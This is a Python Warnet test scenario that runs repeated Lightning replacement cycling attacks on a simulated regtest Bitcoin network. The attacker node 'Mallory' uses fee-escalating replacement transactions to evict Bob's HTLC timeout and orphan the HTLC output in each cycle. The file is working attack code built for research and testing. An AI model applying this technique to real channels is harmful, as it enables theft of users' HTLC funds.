#!/usr/bin/env python3

"""
Test scenario: Multiple replacement cycling attack iterations.

Runs 3 complete attack cycles. Each cycle:
  1. Create fresh Box M + m_child
  2. Bob broadcasts htlc_timeout
  3. Mallory broadcasts htlc_preimage (evicts timeout + m_child)
  4. Mallory broadcasts cycle_out (evicts preimage, orphans HTLC output)
  5. Mine a block (confirms cycle_out, clears mempool for next cycle)
  6. Bob rebroadcasts htlc_timeout in next cycle

Run: warnet run scenarios/test_multi_cycle.py --debug

Assertions after all cycles:
  - HTLC output has been orphaned in every cycle
  - No mining occurred during the cycling phases (only between cycles)
  - Bob's htlc_timeout was evicted every cycle
"""

import hashlib
from typing import Dict, List, Tuple

from commander import Commander
from test_framework.test_node import TestNode
from test_framework.key import ECKey


# ---------------------------------------------------------------------------
# Helpers — wallet, funding, keys
# ---------------------------------------------------------------------------

def setup_wallets(alice: TestNode, bob: TestNode, mallory: TestNode) -> None:
    for node, name in [(alice, "alice"), (bob, "bob"), (mallory, "mallory")]:
        wallets = node.listwallets()
        if name not in wallets:
            node.createwallet(name, descriptors=True)


def fund_miner(alice: TestNode, blocks: int = 101) -> str:
    addr: str = alice.getnewaddress()
    alice.rpc.generatetoaddress(blocks, addr)
    return addr


def fund_participants(
    alice: TestNode, bob: TestNode, mallory: TestNode,
    miner_addr: str, amount: float = 10.0,
) -> Tuple[str, str]:
    bob_addr: str = bob.getnewaddress()
    mallory_addr: str = mallory.getnewaddress()
    alice.sendtoaddress(bob_addr, amount)
    alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)
    return bob_addr, mallory_addr


def generate_keypair() -> Tuple[ECKey, str]:
    key: ECKey = ECKey()
    key.generate(compressed=True)
    return key, key.get_pubkey().get_bytes().hex()


def eckey_to_wif(key: ECKey, testnet: bool = True) -> str:
    prefix: bytes = b'\xef' if testnet else b'\x80'
    extended: bytes = prefix + key.get_bytes() + b'\x01'
    checksum: bytes = hashlib.sha256(hashlib.sha256(extended).digest()).digest()[:4]
    return _base58_encode(extended + checksum)


def _base58_encode(data: bytes) -> str:
    alphabet: str = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num: int = int.from_bytes(data, 'big')
    result: str = ''
    while num > 0:
        num, remainder = divmod(num, 58)
        result = alphabet[remainder] + result
    for byte in data:
        if byte == 0:
            result = '1' + result
        else:
            break
    return result


# ---------------------------------------------------------------------------
# Helpers — HTLC output
# ---------------------------------------------------------------------------

def create_htlc_output(
    alice: TestNode, miner_addr: str, htlc_amount: float = 1.0,
) -> Dict[str, object]:
    bob_key, bob_pubkey = generate_keypair()
    mallory_key, mallory_pubkey = generate_keypair()

    multisig: dict = alice.createmultisig(2, [bob_pubkey, mallory_pubkey])
    htlc_txid: str = alice.sendtoaddress(multisig["address"], htlc_amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(htlc_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    htlc_vout: int = None
    htlc_scriptPubKey: str = None
    for vout in decoded["vout"]:
        if abs(float(vout["value"]) - htlc_amount) < 0.0001:
            htlc_vout = vout["n"]
            htlc_scriptPubKey = vout["scriptPubKey"]["hex"]
            break
    assert htlc_vout is not None, "Could not find HTLC output"

    return {
        "htlc_txid": htlc_txid, "htlc_vout": htlc_vout,
        "htlc_amount": htlc_amount, "htlc_scriptPubKey": htlc_scriptPubKey,
        "redeem_script": multisig["redeemScript"], "multisig_address": multisig["address"],
        "bob_pubkey": bob_pubkey, "mallory_pubkey": mallory_pubkey,
        "bob_wif": eckey_to_wif(bob_key), "mallory_wif": eckey_to_wif(mallory_key),
    }


# ---------------------------------------------------------------------------
# Helpers — Box M and M-child
# ---------------------------------------------------------------------------

def create_box_m(
    alice: TestNode, mallory: TestNode, miner_addr: str, amount: float = 0.1,
) -> Dict[str, object]:
    mallory_addr: str = mallory.getnewaddress()
    box_m_txid: str = alice.sendtoaddress(mallory_addr, amount)
    alice.rpc.generatetoaddress(1, miner_addr)

    wallet_tx: dict = alice.gettransaction(box_m_txid)
    decoded: dict = alice.decoderawtransaction(wallet_tx["hex"])
    for vout in decoded["vout"]:
        if vout["scriptPubKey"].get("address") == mallory_addr:
            return {
                "box_m_txid": box_m_txid, "box_m_vout": vout["n"],
                "box_m_amount": float(vout["value"]), "box_m_address": mallory_addr,
                "box_m_scriptPubKey": vout["scriptPubKey"]["hex"],
            }
    raise AssertionError("Could not find Box M output")


def create_m_child(
    mallory: TestNode, box_m: Dict[str, object], fee_rate_sat_vb: int = 1,
) -> Dict[str, str]:
    mallory_addr: str = mallory.getnewaddress()
    fee_btc: float = (fee_rate_sat_vb * 150) / 1e8
    raw_hex: str = mallory.createrawtransaction(
        [{"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD}],
        {mallory_addr: round(box_m["box_m_amount"] - fee_btc, 8)},
    )
    signed: dict = mallory.signrawtransactionwithwallet(raw_hex)
    assert signed["complete"], "m_child signing failed"
    m_child_txid: str = mallory.sendrawtransaction(signed["hex"])
    return {"m_child_txid": m_child_txid, "m_child_hex": signed["hex"]}


# ---------------------------------------------------------------------------
# Helpers — htlc_timeout, htlc_preimage, cycle_out
# ---------------------------------------------------------------------------

def create_htlc_timeout(
    node: TestNode, htlc: Dict[str, object],
    dest_address: str, fee_rate_sat_vb: int = 2,
    n_sequence: int = 0xFFFFFFFD,
) -> Dict[str, object]:
    """
    n_sequence must change each cycle to produce a different txid,
    otherwise p2p layer rejects the rebroadcast as already-seen.
    Values < 0xFFFFFFFE signal RBF. Use 0xFFFFFFFD, 0xFFFFFFFC, etc.
    """
    fee_btc: float = (fee_rate_sat_vb * 300) / 1e8
    raw_hex: str = node.createrawtransaction(
        [{"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"], "sequence": n_sequence}],
        {dest_address: round(htlc["htlc_amount"] - fee_btc, 8)},
    )
    prevtxs: list = [{
        "txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
        "scriptPubKey": htlc["htlc_scriptPubKey"],
        "redeemScript": htlc["redeem_script"], "amount": htlc["htlc_amount"],
    }]
    signed: dict = node.signrawtransactionwithkey(
        raw_hex, [htlc["bob_wif"], htlc["mallory_wif"]], prevtxs,
    )
    assert signed["complete"], "htlc_timeout signing failed"
    return {"htlc_timeout_hex": signed["hex"], "htlc_timeout_fee": fee_btc}


def create_htlc_preimage(
    node: TestNode, htlc: Dict[str, object], box_m: Dict[str, object],
    mallory: TestNode, dest_address: str, fee_rate_sat_vb: int = 10,
) -> Dict[str, object]:
    total_input: float = htlc["htlc_amount"] + box_m["box_m_amount"]
    fee_btc: float = (fee_rate_sat_vb * 400) / 1e8
    raw_hex: str = node.createrawtransaction(
        [
            {"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"], "sequence": 0xFFFFFFFD},
            {"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD},
        ],
        {dest_address: round(total_input - fee_btc, 8)},
    )
    prevtxs: list = [
        {"txid": htlc["htlc_txid"], "vout": htlc["htlc_vout"],
         "scriptPubKey": htlc["htlc_scriptPubKey"],
         "redeemScript": htlc["redeem_script"], "amount": htlc["htlc_amount"]},
        {"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"],
         "scriptPubKey": box_m["box_m_scriptPubKey"], "amount": box_m["box_m_amount"]},
    ]
    partially_signed: dict = node.signrawtransactionwithkey(
        raw_hex, [htlc["bob_wif"], htlc["mallory_wif"]], prevtxs,
    )
    fully_signed: dict = mallory.signrawtransactionwithwallet(partially_signed["hex"])
    assert fully_signed["complete"], f"htlc_preimage signing failed: {fully_signed.get('errors')}"
    return {"htlc_preimage_hex": fully_signed["hex"], "htlc_preimage_fee": fee_btc}


def create_cycle_out(
    mallory: TestNode, box_m: Dict[str, object],
    preimage_fee_btc: float, fee_rate_sat_vb: int = 30,
) -> Dict[str, object]:
    mallory_addr: str = mallory.getnewaddress()
    fee_btc: float = (fee_rate_sat_vb * 150) / 1e8
    assert fee_btc > preimage_fee_btc, (
        f"cycle_out fee ({fee_btc}) must exceed preimage fee ({preimage_fee_btc})"
    )
    raw_hex: str = mallory.createrawtransaction(
        [{"txid": box_m["box_m_txid"], "vout": box_m["box_m_vout"], "sequence": 0xFFFFFFFD}],
        {mallory_addr: round(box_m["box_m_amount"] - fee_btc, 8)},
    )
    signed: dict = mallory.signrawtransactionwithwallet(raw_hex)
    assert signed["complete"], "cycle_out signing failed"
    cycle_out_txid: str = mallory.sendrawtransaction(signed["hex"])
    return {"cycle_out_txid": cycle_out_txid, "cycle_out_hex": signed["hex"], "cycle_out_fee": fee_btc}


# ---------------------------------------------------------------------------
# Helpers — verification
# ---------------------------------------------------------------------------

def verify_htlc_output_orphaned(node: TestNode, htlc: Dict[str, object]) -> None:
    """Assert that no transaction in the mempool spends htlc_output."""
    mempool_txids: list = node.getrawmempool()
    for txid in mempool_txids:
        raw_tx: str = node.getrawtransaction(txid)
        decoded: dict = node.decoderawtransaction(raw_tx)
        for vin in decoded["vin"]:
            if vin["txid"] == htlc["htlc_txid"] and vin["vout"] == htlc["htlc_vout"]:
                raise AssertionError(
                    f"htlc_output is NOT orphaned — spent by {txid[:16]}... in mempool"
                )


# ---------------------------------------------------------------------------
# Scenario
# ---------------------------------------------------------------------------

class TestMultiCycle(Commander):

    def set_test_params(self) -> None:
        self.num_nodes = 3

    def add_options(self, parser) -> None:
        parser.description = "Test multiple replacement cycling attack iterations"
        parser.usage = "warnet run /path/to/test_multi_cycle.py"
        parser.add_argument("--cycles", type=int, default=3,
                            help="Number of attack cycles to run (default: 3)")

    def run_test(self) -> None:
        self.log.info("Waiting for L1 p2p network connections...")
        self.wait_for_tanks_connected()

        alice: TestNode = self.nodes[0]
        bob: TestNode = self.nodes[1]
        mallory: TestNode = self.nodes[2]
        num_cycles: int = self.options.cycles

        # --- Setup ---
        self.log.info("Setting up wallets and funding...")
        setup_wallets(alice, bob, mallory)
        miner_addr: str = fund_miner(alice, blocks=101)
        fund_participants(alice, bob, mallory, miner_addr, amount=10.0)

        # --- Create HTLC output (once, shared across all cycles) ---
        htlc_amount: float = 1.0
        self.log.info(f"Creating HTLC output ({htlc_amount} BTC)...")
        htlc: dict = create_htlc_output(alice, miner_addr, htlc_amount=htlc_amount)
        self.log.info(f"HTLC output: {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")

        bob_dest: str = bob.getnewaddress()
        total_attacker_cost_sats: int = 0
        base_height: int = alice.getblockcount()

        # --- Attack cycles ---
        for cycle in range(num_cycles):
            self.log.info(f"\n{'='*50}")
            self.log.info(f"  CYCLE {cycle + 1} / {num_cycles}")
            self.log.info(f"{'='*50}")

            # Fee escalation per cycle
            # cycle_out (150 vB) must exceed preimage (400 vB) in absolute fee
            # So cycle_out_fee_rate must be > preimage_fee_rate * 400/150 ≈ 2.67x
            timeout_fee_rate: int = 2
            preimage_fee_rate: int = 10 + (cycle * 5)
            cycle_out_fee_rate: int = (preimage_fee_rate * 3) + 1  # 3x ensures absolute fee is higher

            # 1. Create fresh Box M (each cycle needs a new one)
            self.log.info(f"  [1] Creating fresh Box M...")
            box_m: dict = create_box_m(alice, mallory, miner_addr, amount=0.1)
            self.log.info(f"      Box M: {box_m['box_m_txid'][:16]}...:{box_m['box_m_vout']}")

            # 2. Broadcast m_child (spends Box M)
            self.log.info(f"  [2] Broadcasting m_child...")
            m_child: dict = create_m_child(mallory, box_m, fee_rate_sat_vb=1)
            self.sync_all()
            self.log.info(f"      m_child: {m_child['m_child_txid'][:16]}...")

            # 3. Bob broadcasts htlc_timeout (nSequence changes each cycle for new txid)
            n_sequence: int = 0xFFFFFFFD - cycle  # 0xFFFFFFFD, 0xFFFFFFFC, 0xFFFFFFFB...
            self.log.info(f"  [3] Bob broadcasts htlc_timeout (nSequence={hex(n_sequence)})...")
            timeout: dict = create_htlc_timeout(
                bob, htlc, bob_dest, fee_rate_sat_vb=timeout_fee_rate,
                n_sequence=n_sequence,
            )
            timeout_txid: str = bob.sendrawtransaction(timeout["htlc_timeout_hex"])
            self.sync_all()
            self.log.info(f"      htlc_timeout: {timeout_txid[:16]}...")

            # 4. Mallory broadcasts htlc_preimage (evicts timeout + m_child)
            mallory_dest: str = mallory.getnewaddress()
            self.log.info(f"  [4] Mallory broadcasts htlc_preimage ({preimage_fee_rate} sat/vB)...")
            preimage: dict = create_htlc_preimage(
                alice, htlc, box_m, mallory, mallory_dest,
                fee_rate_sat_vb=preimage_fee_rate,
            )
            preimage_txid: str = mallory.sendrawtransaction(preimage["htlc_preimage_hex"])
            self.sync_all()

            mempool: list = alice.getrawmempool()
            assert preimage_txid in mempool, "htlc_preimage not in mempool"
            assert timeout_txid not in mempool, "htlc_timeout should be evicted"
            assert m_child["m_child_txid"] not in mempool, "m_child should be evicted"
            self.log.info(f"      ✓ htlc_timeout EVICTED")
            self.log.info(f"      ✓ m_child EVICTED")

            # 5. Mallory broadcasts cycle_out (evicts htlc_preimage)
            self.log.info(f"  [5] Mallory broadcasts cycle_out ({cycle_out_fee_rate} sat/vB)...")
            cycle_out: dict = create_cycle_out(
                mallory, box_m, preimage["htlc_preimage_fee"],
                fee_rate_sat_vb=cycle_out_fee_rate,
            )
            self.sync_all()

            mempool: list = alice.getrawmempool()
            assert cycle_out["cycle_out_txid"] in mempool, "cycle_out not in mempool"
            assert preimage_txid not in mempool, "htlc_preimage should be evicted"

            # VERIFY: HTLC output is orphaned
            verify_htlc_output_orphaned(alice, htlc)
            self.log.info(f"      ✓ htlc_preimage EVICTED")
            self.log.info(f"      ✓ htlc_output ORPHANED")

            # Track attacker cost
            cycle_cost_sats: int = int(preimage["htlc_preimage_fee"] * 1e8) + int(cycle_out["cycle_out_fee"] * 1e8)
            total_attacker_cost_sats += cycle_cost_sats
            self.log.info(f"      Attacker cost this cycle: ~{cycle_cost_sats} sats")

            # 6. Mine a block to clear mempool for next cycle
            self.log.info(f"  [6] Mining block to clear mempool...")
            alice.rpc.generatetoaddress(1, miner_addr)
            self.sync_all()
            assert len(alice.getrawmempool()) == 0, "Mempool should be empty after mining"
            self.log.info(f"      Block mined. Mempool clear.")

        # --- Final assertions ---
        final_height: int = alice.getblockcount()
        blocks_mined: int = final_height - base_height

        self.log.info(f"\n{'='*50}")
        self.log.info(f"  ALL {num_cycles} CYCLES COMPLETE")
        self.log.info(f"{'='*50}")
        self.log.info(f"  HTLC output:         {htlc['htlc_txid'][:16]}...:{htlc['htlc_vout']}")
        self.log.info(f"  HTLC amount:         {htlc_amount} BTC")
        self.log.info(f"  Cycles executed:     {num_cycles}")
        self.log.info(f"  Blocks mined:        {blocks_mined} (for Box M creation + cycle clearing)")
        self.log.info(f"  Total attacker cost: ~{total_attacker_cost_sats} sats")
        self.log.info(f"  Cost/stolen ratio:   {total_attacker_cost_sats / (htlc_amount * 1e8) * 100:.4f}%")
        self.log.info(f"  HTLC output status:  STILL UNSPENT (orphaned every cycle)")
        self.log.info(f"{'='*50}")
        self.log.info(f"  MULTI-CYCLE REPLACEMENT CYCLING ATTACK — PASSED")
        self.log.info(f"{'='*50}")


def main():
    TestMultiCycle().main()


if __name__ == "__main__":
    main()
